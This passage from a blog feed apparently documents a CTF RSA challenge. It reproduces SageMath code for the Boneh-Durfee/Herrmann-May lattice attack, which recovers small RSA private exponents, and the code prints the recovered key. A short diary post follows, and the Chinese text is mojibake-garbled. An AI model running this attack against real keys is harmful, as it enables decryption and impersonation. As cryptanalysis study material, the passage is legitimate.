XX<span class="token punctuation">,</span> YY<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Boneh and Durfee revisited by Herrmann and May    finds a solution if:    * d &lt; N^delta    * |x| &lt; e^delta    * |y| &lt; e^0.5    whenever delta &lt; 1 - sqrt(2)/2 ~ 0.292    """</span>    <span class="token comment" spellcheck="true"># substitution (Herrman and May)</span>    PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>u<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>ZZ<span class="token punctuation">)</span>    Q <span class="token operator">=</span> PR<span class="token punctuation">.</span>quotient<span class="token punctuation">(</span>x<span class="token operator">*</span>y <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">-</span> u<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># u = xy + 1</span>    polZ <span class="token operator">=</span> Q<span class="token punctuation">(</span>pol<span class="token punctuation">)</span><span class="token punctuation">.</span>lift<span class="token punctuation">(</span><span class="token punctuation">)</span>    UU <span class="token operator">=</span> XX<span class="token operator">*</span>YY <span class="token operator">+</span> <span class="token number">1</span>    <span class="token comment" spellcheck="true"># x-shifts</span>    gg <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> kk <span class="token keyword">in</span> range<span class="token punctuation">(</span>mm <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> ii <span class="token keyword">in</span> range<span class="token punctuation">(</span>mm <span class="token operator">-</span> kk <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            xshift <span class="token operator">=</span> x<span class="token operator">^</span>ii <span class="token operator">*</span> modulus<span class="token operator">^</span><span class="token punctuation">(</span>mm <span class="token operator">-</span> kk<span class="token punctuation">)</span> <span class="token operator">*</span> polZ<span class="token punctuation">(</span>u<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token operator">^</span>kk            gg<span class="token punctuation">.</span>append<span class="token punctuation">(</span>xshift<span class="token punctuation">)</span>    gg<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># x-shifts list of monomials</span>    monomials <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> polynomial <span class="token keyword">in</span> gg<span class="token punctuation">:</span>        <span class="token keyword">for</span> monomial <span class="token keyword">in</span> polynomial<span class="token punctuation">.</span>monomials<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> monomial <span class="token operator">not</span> <span class="token keyword">in</span> monomials<span class="token punctuation">:</span>                monomials<span class="token punctuation">.</span>append<span class="token punctuation">(</span>monomial<span class="token punctuation">)</span>    monomials<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># y-shifts (selected by Herrman and May)</span>    <span class="token keyword">for</span> jj <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> tt <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> kk <span class="token keyword">in</span> range<span class="token punctuation">(</span>floor<span class="token punctuation">(</span>mm<span class="token operator">/</span>tt<span class="token punctuation">)</span> <span class="token operator">*</span> jj<span class="token punctuation">,</span> mm <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            yshift <span class="token operator">=</span> y<span class="token operator">^</span>jj <span class="token operator">*</span> polZ<span class="token punctuation">(</span>u<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token operator">^</span>kk <span class="token operator">*</span> modulus<span class="token operator">^</span><span class="token punctuation">(</span>mm <span class="token operator">-</span> kk<span class="token punctuation">)</span>            yshift <span class="token operator">=</span> Q<span class="token punctuation">(</span>yshift<span class="token punctuation">)</span><span class="token punctuation">.</span>lift<span class="token punctuation">(</span><span class="token punctuation">)</span>            gg<span class="token punctuation">.</span>append<span class="token punctuation">(</span>yshift<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># substitution</span>    <span class="token comment" spellcheck="true"># y-shifts list of monomials</span>    <span class="token keyword">for</span> jj <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> tt <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> kk <span class="token keyword">in</span> range<span class="token punctuation">(</span>floor<span class="token punctuation">(</span>mm<span class="token operator">/</span>tt<span class="token punctuation">)</span> <span class="token operator">*</span> jj<span class="token punctuation">,</span> mm <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            monomials<span class="token punctuation">.</span>append<span class="token punctuation">(</span>u<span class="token operator">^</span>kk <span class="token operator">*</span> y<span class="token operator">^</span>jj<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># construct lattice B</span>    nn <span class="token operator">=</span> len<span class="token punctuation">(</span>monomials<span class="token punctuation">)</span>    BB <span class="token operator">=</span> Matrix<span class="token punctuation">(</span>ZZ<span class="token punctuation">,</span> nn<span class="token punctuation">)</span>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> range<span class="token punctuation">(</span>nn<span class="token punctuation">)</span><span class="token punctuation">:</span>        BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> gg<span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> jj <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> ii <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span> <span class="token keyword">in</span> gg<span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token punctuation">.</span>monomials<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> jj<span class="token punctuation">]</span> <span class="token operator">=</span> gg<span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token punctuation">.</span>monomial_coefficient<span class="token punctuation">(</span>monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">(</span>UU<span class="token punctuation">,</span>XX<span class="token punctuation">,</span>YY<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># Prototype to reduce the lattice</span>    <span class="token keyword">if</span> helpful_only<span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># automatically remove</span>        BB <span class="token operator">=</span> remove_unhelpful<span class="token punctuation">(</span>BB<span class="token punctuation">,</span> monomials<span class="token punctuation">,</span> modulus<span class="token operator">^</span>mm<span class="token punctuation">,</span> nn<span class="token number">-1</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># reset dimension</span>        nn <span class="token operator">=</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> nn <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">"failure"</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span>    <span class="token comment" spellcheck="true"># check if vectors are helpful</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        helpful_vectors<span class="token punctuation">(</span>BB<span class="token punctuation">,</span> modulus<span class="token operator">^</span>mm<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># check if determinant is correctly bounded</span>    det <span class="token operator">=</span> BB<span class="token punctuation">.</span>det<span class="token punctuation">(</span><span class="token punctuation">)</span>    bound <span class="token operator">=</span> modulus<span class="token operator">^</span><span class="token punctuation">(</span>mm<span class="token operator">*</span>nn<span class="token punctuation">)</span>    <span class="token keyword">if</span> det <span class="token operator">>=</span> bound<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"We do not have det &lt; bound. Solutions might not be found."</span>        <span class="token keyword">print</span> <span class="token string">"Try with highers m and t."</span>        <span class="token keyword">if</span> debug<span class="token punctuation">:</span>            diff <span class="token operator">=</span> <span class="token punctuation">(</span>log<span class="token punctuation">(</span>det<span class="token punctuation">)</span> <span class="token operator">-</span> log<span class="token punctuation">(</span>bound<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> log<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>            <span class="token keyword">print</span> <span class="token string">"size det(L) - size e^(m*n) = "</span><span class="token punctuation">,</span> floor<span class="token punctuation">(</span>diff<span class="token punctuation">)</span>        <span class="token keyword">if</span> strict<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)"</span>    <span class="token comment" spellcheck="true"># display the lattice basis</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        matrix_overview<span class="token punctuation">(</span>BB<span class="token punctuation">,</span> modulus<span class="token operator">^</span>mm<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># LLL</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"optimizing basis of the lattice via LLL, this can take a long time"</span>    BB <span class="token operator">=</span> BB<span class="token punctuation">.</span>LLL<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"LLL is done!"</span>    <span class="token comment" spellcheck="true"># transform vector i &amp; j -> polynomials 1 &amp; 2</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"looking for independent vectors in the lattice"</span>    found_polynomials <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">for</span> pol1_idx <span class="token keyword">in</span> range<span class="token punctuation">(</span>nn <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> pol2_idx <span class="token keyword">in</span> range<span class="token punctuation">(</span>pol1_idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> nn<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># for i and j, create the two polynomials</span>            PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>w<span class="token punctuation">,</span>z<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>ZZ<span class="token punctuation">)</span>            pol1 <span class="token operator">=</span> pol2 <span class="token operator">=</span> <span class="token number">0</span>            <span class="token keyword">for</span> jj <span class="token keyword">in</span> range<span class="token punctuation">(</span>nn<span class="token punctuation">)</span><span class="token punctuation">:</span>                pol1 <span class="token operator">+=</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">(</span>w<span class="token operator">*</span>z<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>w<span class="token punctuation">,</span>z<span class="token punctuation">)</span> <span class="token operator">*</span> BB<span class="token punctuation">[</span>pol1_idx<span class="token punctuation">,</span> jj<span class="token punctuation">]</span> <span class="token operator">/</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">(</span>UU<span class="token punctuation">,</span>XX<span class="token punctuation">,</span>YY<span class="token punctuation">)</span>                pol2 <span class="token operator">+=</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">(</span>w<span class="token operator">*</span>z<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>w<span class="token punctuation">,</span>z<span class="token punctuation">)</span> <span class="token operator">*</span> BB<span class="token punctuation">[</span>pol2_idx<span class="token punctuation">,</span> jj<span class="token punctuation">]</span> <span class="token operator">/</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">(</span>UU<span class="token punctuation">,</span>XX<span class="token punctuation">,</span>YY<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># resultant</span>            PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>q<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>ZZ<span class="token punctuation">)</span>            rr <span class="token operator">=</span> pol1<span class="token punctuation">.</span>resultant<span class="token punctuation">(</span>pol2<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># are these good polynomials?</span>            <span class="token keyword">if</span> rr<span class="token punctuation">.</span>is_zero<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">or</span> rr<span class="token punctuation">.</span>monomials<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span> <span class="token string">"found them, using vectors"</span><span class="token punctuation">,</span> pol1_idx<span class="token punctuation">,</span> <span class="token string">"and"</span><span class="token punctuation">,</span> pol2_idx                found_polynomials <span class="token operator">=</span> <span class="token boolean">True</span>                <span class="token keyword">break</span>        <span class="token keyword">if</span> found_polynomials<span class="token punctuation">:</span>            <span class="token keyword">break</span>    <span class="token keyword">if</span> <span class="token operator">not</span> found_polynomials<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"no independant vectors could be found. This should very rarely happen..."</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>    rr <span class="token operator">=</span> rr<span class="token punctuation">(</span>q<span class="token punctuation">,</span> q<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># solutions</span>    soly <span class="token operator">=</span> rr<span class="token punctuation">.</span>roots<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>soly<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"Your prediction (delta) is too small"</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>    soly <span class="token operator">=</span> soly<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    ss <span class="token operator">=</span> pol1<span class="token punctuation">(</span>q<span class="token punctuation">,</span> soly<span class="token punctuation">)</span>    solx <span class="token operator">=</span> ss<span class="token punctuation">.</span>roots<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token keyword">return</span> solx<span class="token punctuation">,</span> soly<span class="token keyword">def</span> <span class="token function">example</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">############################################</span>    <span class="token comment" spellcheck="true"># How To Use This Script</span>    <span class="token comment" spellcheck="true">##########################################</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># The problem to solve (edit the following values)</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># the modulus</span>    N <span class="token operator">=</span> <span class="token number">0xc2fd2913bae61f845ac94e4ee1bb10d8531dda830d31bb221dac5f179a8f883f15046d7aa179aff848db2734b8f88cc73d09f35c445c74ee35b01a96eb7b0a6ad9cb9ccd6c02c3f8c55ecabb55501bb2c318a38cac2db69d510e152756054aaed064ac2a454e46d9b3b755b67b46906fbff8dd9aeca6755909333f5f81bf74db</span>    <span class="token comment" spellcheck="true"># the public exponent</span>    e <span class="token operator">=</span> <span class="token number">0x19441f679c9609f2484eb9b2658d7138252b847b2ed8ad182be7976ed57a3e441af14897ce041f3e07916445b88181c22f510150584eee4b0f776a5a487a4472a99f2ddc95efdd2b380ab4480533808b8c92e63ace57fb42bac8315fa487d03bec86d854314bc2ec4f99b192bb98710be151599d60f224114f6b33f47e357517</span>    <span class="token comment" spellcheck="true"># the hypothesis on the private exponent (the theoretical maximum is 0.292)</span>    delta <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token number">18</span> <span class="token comment" spellcheck="true"># this means that d &lt; N^delta</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># Lattice (tweak those values)</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># you should tweak this (after a first run), (e.g. increment it until a solution is found)</span>    m <span class="token operator">=</span> <span class="token number">4</span> <span class="token comment" spellcheck="true"># size of the lattice (bigger the better/slower)</span>    <span class="token comment" spellcheck="true"># you need to be a lattice master to tweak these</span>    t <span class="token operator">=</span> int<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">2</span><span class="token operator">*</span>delta<span class="token punctuation">)</span> <span class="token operator">*</span> m<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># optimization from Herrmann and May</span>    X <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">*</span>floor<span class="token punctuation">(</span>N<span class="token operator">^</span>delta<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># this _might_ be too much</span>    Y <span class="token operator">=</span> floor<span class="token punctuation">(</span>N<span class="token operator">^</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># correct if p, q are ~ same size</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># Don't touch anything below</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># Problem put in equation</span>    P<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token punctuation">,</span>y<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>ZZ<span class="token punctuation">)</span>    A <span class="token operator">=</span> int<span class="token punctuation">(</span><span class="token punctuation">(</span>N<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span>    pol <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">+</span> x <span class="token operator">*</span> <span class="token punctuation">(</span>A <span class="token operator">+</span> y<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># Find the solutions!</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># Checking bounds</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"=== checking values ==="</span>        <span class="token keyword">print</span> <span class="token string">"* delta:"</span><span class="token punctuation">,</span> delta        <span class="token keyword">print</span> <span class="token string">"* delta &lt; 0.292"</span><span class="token punctuation">,</span> delta <span class="token operator">&lt;</span> <span class="token number">0.292</span>        <span class="token keyword">print</span> <span class="token string">"* size of e:"</span><span class="token punctuation">,</span> int<span class="token punctuation">(</span>log<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token operator">/</span>log<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">"* size of N:"</span><span class="token punctuation">,</span> int<span class="token punctuation">(</span>log<span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token operator">/</span>log<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">"* m:"</span><span class="token punctuation">,</span> m<span class="token punctuation">,</span> <span class="token string">", t:"</span><span class="token punctuation">,</span> t    <span class="token comment" spellcheck="true"># boneh_durfee</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"=== running algorithm ==="</span>        start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    solx<span class="token punctuation">,</span> soly <span class="token operator">=</span> boneh_durfee<span class="token punctuation">(</span>pol<span class="token punctuation">,</span> e<span class="token punctuation">,</span> m<span class="token punctuation">,</span> t<span class="token punctuation">,</span> X<span class="token punctuation">,</span> Y<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># found a solution?</span>    <span class="token keyword">if</span> solx <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"=== solution found ==="</span>        <span class="token keyword">if</span> <span class="token boolean">False</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">"x:"</span><span class="token punctuation">,</span> solx            <span class="token keyword">print</span> <span class="token string">"y:"</span><span class="token punctuation">,</span> soly        d <span class="token operator">=</span> int<span class="token punctuation">(</span>pol<span class="token punctuation">(</span>solx<span class="token punctuation">,</span> soly<span class="token punctuation">)</span> <span class="token operator">/</span> e<span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">"private key found:"</span><span class="token punctuation">,</span> d    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"=== no solution was found ==="</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"=== %s seconds ==="</span> <span class="token operator">%</span> <span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start_time<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    example<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="ğŸˆå°ç»“"><a href="#ğŸˆå°ç»“" class="headerlink" title="ğŸˆå°ç»“"></a>ğŸˆå°ç»“</h2><blockquote><p>è¿™é¢˜å¾ˆå¥½åœ°å¸®è‡ªå·±è®¤è¯†äº†ä¸€æ³¢RSAçš„å„ç§å§¿åŠ¿ï¼Œæ·±å…¥åœ°å­¦ä¹ äº†ä¸€ä¸‹RSAã€‚</p></blockquote><h2 id="ğŸ“•å‚è€ƒ"><a href="#ğŸ“•å‚è€ƒ" class="headerlink" title="ğŸ“•å‚è€ƒ"></a>ğŸ“•å‚è€ƒ</h2><p><a href="http://inaz2.hatenablog.com/entry/2016/01/20/022936" target="_blank" rel="noopener">http://inaz2.hatenablog.com/entry/2016/01/20/022936</a></p><p><a href="https://github.com/mimoo/RSA-and-LLL-attacks" target="_blank" rel="noopener">https://github.com/mimoo/RSA-and-LLL-attacks</a></p><p><a href="https://cocalc.com/projects/4d6e5d25-114c-4e64-9f9a-14a88addf2e5/files/2019-05-25-224507.sagews?session=default" target="_blank" rel="noopener">https://cocalc.com/projects/4d6e5d25-114c-4e64-9f9a-14a88addf2e5/files/2019-05-25-224507.sagews?session=default</a></p><p><a href="https://www.cnblogs.com/WangAoBo/p/8654120.html" target="_blank" rel="noopener">https://www.cnblogs.com/WangAoBo/p/8654120.html</a></p><p><a href="https://www.cnblogs.com/WangAoBo/p/7541481.html" target="_blank" rel="noopener">https://www.cnblogs.com/WangAoBo/p/7541481.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ä¸€é“RSAè¿‡ä¸€éå„ç§æ”»å‡»ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="å¯†ç å­¦" scheme="http://www.yof3ng.xyz/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="å¼ºç½‘æ¯" scheme="http://www.yof3ng.xyz/tags/%E5%BC%BA%E7%BD%91%E6%9D%AF/"/>
    
      <category term="RSA" scheme="http://www.yof3ng.xyz/tags/RSA/"/>
    
  </entry>
  
  <entry>
    <title>New_start</title>
    <link href="http://www.yof3ng.xyz/2019/05/23/New-start/"/>
    <id>http://www.yof3ng.xyz/2019/05/23/New-start/</id>
    <published>2019-05-23T15:10:08.000Z</published>
    <updated>2019-05-23T15:22:10.123Z</updated>
    
    <content type="html"><![CDATA[<p>ä»Šå¤©å¼€å§‹ï¼Œå›åˆ°ä»¥å¾€çš„å­¦ä¹ çŠ¶æ€å§ï¼ğŸ™‚</p><a id="more"></a><h1 id="2019å¹´5æœˆ23æ—¥â˜€"><a href="#2019å¹´5æœˆ23æ—¥â˜€" class="headerlink" title="2019å¹´5æœˆ23æ—¥â˜€"></a>2019å¹´5æœˆ23æ—¥â˜€</h1><blockquote><p>è·ä»Šå¾ˆä¹…æ²¡æ›´æ–°åšå®¢äº†ï¼Œä¸€æ–¹é¢å› ä¸ºæ‡’ï¼Œä¸€æ–¹é¢å› ä¸ºå­¦ä¹ çš„åœæ»ï¼Œå„æ–¹é¢åŸå› ã€‚</p><p>è€Œä»Šæ‰“ç®—å›åˆ°ä»¥å¾€çš„å­¦ä¹ çŠ¶æ€ï¼Œå› ä¸ºåªæœ‰è¿™æ ·ï¼Œæ‰æ˜¯å……å®çš„ï¼Œæœ‰è§„åˆ’æœ‰ç›®æ ‡çš„ğŸ˜„ã€‚</p></blockquote><h2 id="è¿™å‡ ä¸ªæœˆåšäº†ä»€ä¹ˆ"><a href="#è¿™å‡ ä¸ªæœˆåšäº†ä»€ä¹ˆ" class="headerlink" title="è¿™å‡ ä¸ªæœˆåšäº†ä»€ä¹ˆ"></a>è¿™å‡ ä¸ªæœˆåšäº†ä»€ä¹ˆ</h2><blockquote><p>è™½ç„¶è®¤è®¤çœŸçœŸåœ°çœ‹èµ°è¿‡æ¥çš„è¿™äº›æ—¥å­ï¼Œç¡®å®æ²¡åšä»€ä¹ˆå¤§äº‹ï¼Œåšçš„éƒ½æ˜¯å®é™…æ„ä¹‰ä¸å¤§çš„å°äº‹æƒ…ï¼Œè‡ªå·±çš„ä¸“ä¸šçŸ¥è¯†å’ŒæŠ€èƒ½ä¹Ÿå¹¶æ²¡æœ‰å¤šå¤§çš„è¿›æ­¥ï¼Œå¯ä»¥è¯´æ˜¯è™šåº¦äº†è®¸å¤šæ—¶å…‰ğŸ™ƒã€‚</p></blockquote><h2 id="æ—¶é—´ä¸å¤šäº†"><a href="#æ—¶é—´ä¸å¤šäº†" class="headerlink" title="æ—¶é—´ä¸å¤šäº†"></a>æ—¶é—´ä¸å¤šäº†</h2><blockquote><p>æ¥ä¸‹æ¥çš„æ—¶é—´ä¸å¤šäº†ï¼Œç¬¬å››ä¸ªå­¦æœŸä¹Ÿåˆ°äº†å°¾å£°ï¼Œä¸€è¾¹è¦å‡†å¤‡å‡ ä¸ªæ¯”èµ›å’Œé¡¹ç›®ï¼ˆå¤§å¤šæ²¡ä»€ä¹ˆæ„ä¹‰ï¼Œä½†ä¹Ÿå¾—å®Œæˆå®ƒä»¬æ‰è¡Œï¼‰ï¼Œä¸€è¾¹è¦æœŸæœ«å¤ä¹ ï¼Œä¸€è¾¹è¿˜å¾—å¼€å§‹æå‡åœæ»è®¸ä¹…ä¸å‰çš„æŠ€æœ¯å¹¿åº¦å’Œæ·±åº¦ã€‚</p><p>ä»»åŠ¡è‰°å·¨ï¼Œå…‰é˜´çè´µï¼Œå¸Œæœ›è‡ªå·±å¤šåšç‚¹æœ‰æ„ä¹‰çš„äº‹æƒ…å§ğŸ’ªï¼Œå’Œèº«è¾¹çš„äººå…±åŒå‰è¡Œï¼Œç›¸äº’æ‰¶æŒä¿ƒè¿›ï¼Œä»¥åè¦å¤šåœ¨æŠ€æœ¯æ–¹é¢è§è§ä¸–é¢å‘€ã€‚</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ä»Šå¤©å¼€å§‹ï¼Œå›åˆ°ä»¥å¾€çš„å­¦ä¹ çŠ¶æ€å§ï¼ğŸ™‚&lt;/p&gt;
    
    </summary>
    
      <category term="éšç¬”" scheme="http://www.yof3ng.xyz/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="éšç¬”" scheme="http://www.yof3ng.xyz/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>Algorithm_Recursive_Tree</title>
    <link href="http://www.yof3ng.xyz/2019/03/17/Algorithm-Recursive-Tree/"/>
    <id>http://www.yof3ng.xyz/2019/03/17/Algorithm-Recursive-Tree/</id>
    <published>2019-03-17T08:50:11.000Z</published>
    <updated>2019-04-02T08:38:05.737Z</updated>
    
